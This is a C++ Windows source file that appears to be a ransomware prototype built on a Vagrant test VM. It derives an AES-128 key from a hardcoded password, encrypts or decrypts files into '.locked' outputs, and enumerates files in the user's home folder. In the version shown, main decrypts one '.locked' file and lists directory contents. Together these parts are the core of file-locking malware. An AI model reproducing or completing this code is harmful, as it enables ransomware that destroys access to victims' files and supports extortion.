#include <iostream>
#include <functional>
#include <sstream>
#include <iomanip>
#include <Windows.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

using FileEnumerator = std::function<bool(const std::string&)>;

#define AES_KEY_SIZE 16
#define IN_CHUNK_SIZE (AES_KEY_SIZE * 10) // a buffer must be a multiple of the key size
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2) // an output buffer (for encryption) must be twice as big

struct CloseHandleRAAI {
    using Disposer = std::function<void()>;
    Disposer m_dispose;
    CloseHandleRAAI(Disposer dispose) : m_dispose(dispose) { }
    ~CloseHandleRAAI() { m_dispose(); }
};

auto utf8_encode(const std::wstring& wstr) -> std::string
{
    int size_needed = WideCharToMultiByte(
        CP_UTF8, 0, &wstr[0],
        (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(
        CP_UTF8, 0, &wstr[0],
        (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// Credits: https://gist.github.com/pezy/8571764
auto utf8_decode(const std::string& str) -> std::wstring
{
    int size_needed = MultiByteToWideChar(
        CP_UTF8, 0,
        &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(
        CP_UTF8, 0, &str[0],
        (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

void CloseHandleLog(HANDLE h, const std::string& name) {
    ::CloseHandle(h);
    std::cerr << " [LOG] Handler <" << name << "> closed OK." << std::endl;
}

auto EnumerateFiles(const std::string& path, FileEnumerator Enumerator) -> int {
    WIN32_FIND_DATAW fdata;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    // Ensure that resource hFind is always disposed. 
    auto close_hFind = CloseHandleRAAI(std::bind(CloseHandleLog, hFind, "hFile"));
    hFind = FindFirstFileW(utf8_decode(path).c_str(), &fdata);
    if (hFind == INVALID_HANDLE_VALUE)
        return GetLastError();
    do { //Consumer function 
        if (!Enumerator(utf8_encode(fdata.cFileName))) break;
    } while (FindNextFileW(hFind, &fdata) != 0);
    return ERROR_SUCCESS;
}

void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecrypt) {

    wchar_t default_key[] = L"3igcZhRdWq96m3GUmTAiv9";
    wchar_t* key_str = default_key;

    if (isDecrypt) {
        printf("Decrypt mode\n");
        isDecrypt = TRUE;
    }
    /*if (argc >= 5) {
        key_str = argv[4];
    } */
    const size_t len = lstrlenW(key_str);
    const size_t key_size = len * sizeof(key_str[0]); // size in bytes

    printf("Key: %S\n", key_str);
    printf("Key len: %#x\n", len);
    printf("Key size: %#x\n", key_size);
    printf("Input File: %S\n", filename);
    printf("Output File: %S\n", filename2);
    printf("----\n");

    HANDLE hInpFile = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hInpFile == INVALID_HANDLE_VALUE) {
        printf("Cannot open input file!\n");
        system("pause");
        return;
    }
    HANDLE hOutFile = CreateFileW(filename2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutFile == INVALID_HANDLE_VALUE) {
        printf("Cannot open output file!\n");
        system("pause");
        return;
    }

    if (isDecrypt) {
        printf("DECRYPTING\n");
    }
    else {
        printf("ENCRYPTING\n");
    }

    DWORD dwStatus = 0;
    BOOL bResult = FALSE;
    wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
    HCRYPTPROV hProv;
    if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        dwStatus = GetLastError();
        printf("CryptAcquireContext failed: %x\n", dwStatus);
        CryptReleaseContext(hProv, 0);
        system("pause");
        return;
    }
    HCRYPTHASH hHash;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        dwStatus = GetLastError();
        printf("CryptCreateHash failed: %x\n", dwStatus);
        CryptReleaseContext(hProv, 0);
        system("pause");
        return;
    }

    if (!CryptHashData(hHash, (BYTE*)key_str, key_size, 0)) {
        DWORD err = GetLastError();
        printf("CryptHashData Failed : %#x\n", err);
        system("pause");
        return;
    }
    printf("[+] CryptHashData Success\n");

    HCRYPTKEY hKey;
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        dwStatus = GetLastError();
        printf("CryptDeriveKey failed: %x\n", dwStatus);
        CryptReleaseContext(hProv, 0);
        system("pause");
        return;
    }
    printf("[+] CryptDeriveKey Success\n");

    const size_t chunk_size = isDecrypt ? IN_CHUNK_SIZE : OUT_CHUNK_SIZE;
    BYTE* chunk = new BYTE[chunk_size];
    DWORD out_len = 0;

    BOOL isFinal = FALSE;
    DWORD readTotalSize = 0;

    DWORD inputSize = GetFileSize(hInpFile, NULL);

    while (bResult = ReadFile(hInpFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
        if (0 == out_len) {
            break;
        }
        readTotalSize += out_len;
        if (readTotalSize >= inputSize) {
            isFinal = TRUE;
            printf("Final chunk set, len: %d = %x\n", out_len, out_len);
        }

        if (isDecrypt) {
            if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
                printf("[-] CryptDecrypt failed: %x\n", GetLastError());
                break;
            }
        }
        else {
            if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
                printf("[-] CryptEncrypt failed: %x\n", GetLastError());
                break;
            }
        }
        DWORD written = 0;
        if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
            printf("writing failed!\n");
            break;
        }
        memset(chunk, 0, chunk_size);
    }

    delete[]chunk; chunk = NULL;

    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);

    CloseHandle(hInpFile);
    CloseHandle(hOutFile);
    printf("Finished. Processed %#x bytes.\n", readTotalSize);
}

//params: <input file> <output file> <is decrypt mode> <key>
int wmain(int argc, wchar_t* argv[])
{
    /*
    if (argc < 4) {
        printf("params: <input file> <output file> <is decrypt mode> [*key]\n");
        system("pause");
        return 0;
    }*/

    const wchar_t* filename = L"c:\\users\\vagrant\\Desktop\\important.txt";
    const wchar_t* filename2 = L"c:\\users\\vagrant\\Desktop\\important.locked";
    encryptFile(filename2, filename, TRUE);

    std::string directoryPath = "c:\\users\\vagrant\\*";

    int count = 0;
    int status = EnumerateFiles(
        directoryPath,
        [&count](const auto& file) {
            std::cout << " => " << file << "\n";
            std::cout << "executed" << std::endl; 
            if (count++ < 50)
                return true;
            else
                return false;
        });


    return 0;
}
